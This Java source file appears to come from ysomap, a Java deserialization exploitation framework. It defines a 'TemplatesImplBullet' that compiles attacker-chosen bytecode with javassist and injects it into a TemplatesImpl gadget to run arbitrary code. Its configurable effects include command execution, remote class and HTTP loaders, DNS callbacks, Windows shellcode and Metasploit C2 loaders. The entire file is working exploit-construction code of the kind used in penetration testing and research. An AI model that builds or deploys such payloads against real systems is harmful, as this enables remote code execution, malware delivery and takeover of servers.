package ysomap.bullets.jdk;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import echo.SocketEchoPayload;
import echo.TomcatEchoPayload;
import javassist.*;
import loader.*;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Strings;
import ysomap.core.util.*;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;
import java.util.zip.GZIPOutputStream;

/**
 * 编译恶意类，并填充到TemplatesImpl
 *
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
@Bullets
@Dependencies({"jdk"})
@Authors({ Authors.WH1T3P1G })
@Targets({Targets.JDK})
@Details("载入恶意class字节码，并执行任意代码，依赖TemplatesImpl")
public class TemplatesImplBullet extends AbstractBullet<Object> {

    private Class templatesImpl;
    private Class abstractTranslet;
    private Class transformerFactoryImpl;

    @NotNull
    @Require(name = "body" ,detail = DetailHelper.BODY)
    private String body = "";

    @NotNull
    @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
            "可选default、SpecialRuntimeExecutor、" +
            "TomcatEcho、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、CustomizableClassLoader")
    private String effect = "default";

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private String exception = "false";

    public String action = "outputProperties";

    private static Map<String, Object[]> effects;

    @Override
    public Object getObject() throws Exception {
        initClazz();
        // create evil bytecodes
        byte[] bytecodes = makeEvilByteCode(body);
        // arm evil bytecodes
        Object templates = templatesImpl.newInstance();
        // inject class bytes into instance
        ReflectionHelper.setFieldValue(templates, "_bytecodes", new byte[][] { bytecodes });
        ReflectionHelper.setFieldValue(templates, "_name", UUID.randomUUID().toString());
        ReflectionHelper.setFieldValue(templates, "_tfactory", transformerFactoryImpl.newInstance());
        return templates;
    }

    private byte[] makeEvilByteCode(String body) throws NotFoundException, CannotCompileException, IOException {
        ClassPool pool = new ClassPool(true);
        CtClass cc = null;
        String code = null;
        Object[] objs = effects.get(effect);
        if(objs != null){
            Class<?> effectClazz = (Class) objs[0];
            String classname = effectClazz.getSimpleName();
            code = process((String) objs[1], (String) objs[2], body);
            pool.appendClassPath(new ClassClassPath(effectClazz));
            cc = pool.getCtClass(effectClazz.getName());
            cc.setName(classname+System.currentTimeMillis());
        }

        if(cc != null){
            if(code != null){
                ClassFiles.insertStaticBlock(cc, code);
            }
            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
            return ClassFiles.getClassBytecode(cc);
        }else{
            return new byte[0];
        }
    }

    private String process(String formater, String action, String body) throws IOException {
        String code = null;
        if(formater != null){
            if(action == null){
                code = String.format(formater, body);
            }else{
                String[] actions = action.split(";");
                Object data = body;
                for(String act:actions){
                    data = doAction(act, data);
                }
                if(data instanceof String){ // String
                    code = String.format(formater, data);
                }else{ // String[]
                    code = String.format(formater, Arrays.stream(((String[])data)).toArray());
                }
            }
        }
        return code;
    }

    public Object doAction(String action, Object data) throws IOException {
        if("split".equals(action) && data instanceof String){
            return ((String) data).split(";");
        }else if("read".equals(action) && data instanceof String){
            return FileHelper.getFileContent((String) data);
        }else if("base64".equals(action) && data instanceof byte[]){
            return Strings.base64ToString((byte[]) data);
        }else if("gzip".equals(action) && data instanceof byte[]){
            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
            gzipOutputStream.write((byte[]) data);
            gzipOutputStream.close();
            return outBuf.toByteArray();
        }else if("arrayToString".equals(action) && data instanceof byte[]){
            return Arrays.toString((byte[]) data)
                    .replace("[", "")
                    .replace("]", "");
        }else if("wrap".equals(action) && data instanceof String){
            if("false".equals(exception)){
                return PayloadHelper.makeRuntimeExecPayload((String) data);
            }else{
                return PayloadHelper.makeExceptionPayload((String) data);
            }
        }
        return data;
    }

    private void initClazz() throws ClassNotFoundException {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            templatesImpl = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstractTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transformerFactoryImpl = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            templatesImpl = TemplatesImpl.class;
            abstractTranslet = AbstractTranslet.class;
            transformerFactoryImpl = TransformerFactoryImpl.class;
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;

        public StubTransletPayload(){
            transletVersion = 101;
        }

        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}

        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }


    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TemplatesImplBullet();
        bullet.set("effect", args[0]);
        bullet.set("body", args[1]);
        bullet.set("exception", args[2]);
        return bullet;
    }

    static {
        effects = new HashMap<>();
        effects.put("default", new Object[]{StubTransletPayload.class, "%s", "wrap"});
        effects.put("TomcatEcho", new Object[]{TomcatEchoPayload.class, null, null});
        effects.put("SocketEcho",
                new Object[]{SocketEchoPayload.class,
                            "host=\"%s\";port=%s;", "split"});
        effects.put("RemoteFileLoader",
                new Object[]{RemoteFileLoader.class,
                            "url=\"%s\";\nclassname=\"%s\";", "split"});
        effects.put("RemoteFileHttpLoader",
                new Object[]{RemoteFileHttpLoader.class,
                            "url=\"%s\";\nclassname=\"%s\";", "split"});
        effects.put("RemoteFileHttpExecutor",
                new Object[]{RemoteFileHttpExecutor.class,
                            "url=\"%s\";\nos=\"%s\";", "split"});
        effects.put("DnslogLoader",
                new Object[]{DnslogLoader.class, "dnslog=\"%s\";", null});
        effects.put("WinC2Loader",
                new Object[]{WinC2Loader.class,
                            "shellcode = new byte[]{%s};", "read;arrayToString"});
        effects.put("MSFJavaC2Loader",
                new Object[]{MSFJavaC2Loader.class,
                            "url=\"%s\";", null});
        effects.put("CustomizableClassLoader",
                new Object[]{CustomizableClassLoader.class,
                            "classBae64Str = \"%s\";", "read;gzip;base64"});
//        effects.put("SpecialRuntimeExecutor",
//                new Object[]{SpecialRuntimeExecutor.class,
//                            "command = \"%s\";", null});
    }

}
